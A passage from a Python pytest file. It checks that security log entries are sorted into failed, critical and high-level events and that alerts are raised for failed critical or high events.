        assert log_result.status == ResultStatus.SUCCESS
        
        entries = log_result.data['entries']
        
        # Analyze security event patterns
        failed_events = [e for e in entries if not e['success']]
        critical_events = [e for e in entries if e['security_level'] == 'critical']
        high_events = [e for e in entries if e['security_level'] == 'high']
        
        # Verify security monitoring data
        assert len(failed_events) >= 2, "Should detect failed security events"
        assert len(critical_events) >= 1, "Should detect critical security events"
        assert len(high_events) >= 2, "Should detect high-priority security events"
        
        # Test security alerting logic (would integrate with actual alerting system)
        alerts_triggered = []
        
        for entry in entries:
            if not entry['success'] and entry['security_level'] in ['critical', 'high']:
                alerts_triggered.append({
                    'operation': entry['operation'],
                    'level': entry['security_level'],
                    'timestamp': entry['timestamp']
                })
        
        assert len(alerts_triggered) >= 2, "Should trigger security alerts for critical/high failed events"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])